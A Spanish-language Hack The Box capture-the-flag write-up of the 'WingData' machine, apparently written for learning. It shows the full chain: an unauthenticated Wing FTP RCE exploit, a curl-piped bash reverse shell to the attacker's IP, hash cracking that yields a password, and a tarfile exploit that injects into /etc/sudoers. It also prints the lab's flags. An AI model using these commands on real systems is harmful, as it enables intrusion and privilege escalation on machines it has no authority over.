
# Hack The Box: WingData Writeup

**WingData** es una máquina de dificultad media que se centra en la explotación de un servidor FTP mal configurado y el abuso de un script de respaldo vulnerable a secuestro de rutas mediante *tarfiles*.

## 1. Enumeración

### Escaneo de Puertos (Nmap)
Iniciamos con un escaneo agresivo para identificar servicios y versiones:
```bash
nmap -sC -sV 10.129.244.106
```
**Resultados:**
*   **Puerto 22 (SSH):** OpenSSH 9.2p1 Debian.
*   **Puerto 80 (HTTP):** Apache httpd 2.4.66. Redirige a `[http://wingdata.htb/](http://wingdata.htb/)`.

### Enumeración Web
Al navegar al sitio, se identifica el software **Wing FTP Server v7.4.3**. Buscamos exploits conocidos para esta versión específica:
```bash
searchsploit Wing FTP Server 7.4.3
```
Se encuentra un exploit de **Ejecución Remota de Código (RCE)** no autenticado (CVE-2025-47812).

---

## 2. Explotación: Acceso Inicial

### Preparación del Payload
Creamos un script de reverse shell (`rev.sh`) y lo servimos mediante un servidor HTTP local en el puerto 80:
```bash
echo 'bash -i >& /dev/tcp/10.10.14.198/443 0>&1' > rev.sh
sudo python3 -m http.server 80
```

### Ejecución del Exploit
Utilizamos el exploit `52347.py` para forzar a la máquina víctima a descargar y ejecutar nuestro script:
```bash
python3 52347.py -u http://ftp.wingdata.htb -c "curl -s http://10.10.14.198/rev.sh | bash"
```
Recibimos la conexión en nuestro listener de Netcat y estabilizamos la shell con Python:
```bash
sudo nc -lvnp 443
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Obtenemos acceso inicial como el usuario `wingftp`.

---

## 3. Movimiento Lateral: Usuario wacky

Explorando el directorio de instalación de Wing FTP (`/opt/wftpserver/Data/1/users`), encontramos archivos XML de configuración de usuarios. El archivo `wacky.xml` contiene un hash de contraseña:
*   **Hash:** `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`
*   **Salt:** `WingFTP`

### Cracking con Hashcat
Identificamos el modo de hash como **SHA256($pass.$salt)** (Modo 1410) y usamos `rockyou.txt`:
```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```
**Contraseña encontrada:** `!#7Blushing^*Bride5`.

Con estas credenciales, accedemos vía SSH y obtenemos la primera flag:
*   **User Flag:** `ce677ccdaa3edddab945855926229579`.

---

## 4. Escalada de Privilegios: Root

### Análisis de Sudo
Revisamos los privilegios de `sudo` del usuario `wacky`:
```bash
sudo -l
```
El usuario puede ejecutar un script de restauración de respaldos como root sin contraseña: `/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *`.

### Explotación de CVE-2025-4517
El script es vulnerable a un ataque de **Tarfile Exploit** que permite realizar un bypass de symlinks y hardlinks para escribir en archivos protegidos del sistema.

1.  Subimos el exploit `CVE-2025-4517-POC.py` a `/tmp`.
2.  Ejecutamos el POC, el cual crea un archivo `.tar` malicioso diseñado para inyectar una entrada en `/etc/sudoers`.
3.  El exploit añade a `wacky` con permisos totales de sudo.

Finalmente, escalamos a root y leemos la flag final:
```bash
sudo /bin/bash
cat /root/root.txt
```
*   **Root Flag:** `4c17e15ee4e486281ced8ea1d30c7ff5`.

---
**Puntos clave aprendidos:**
*   Importancia de no exponer versiones de software en footers.
*   Peligros de usar librerías de descompresión (como `tarfile`) sin sanitizar rutas.
*   Almacenamiento inseguro de hashes en archivos de configuración.
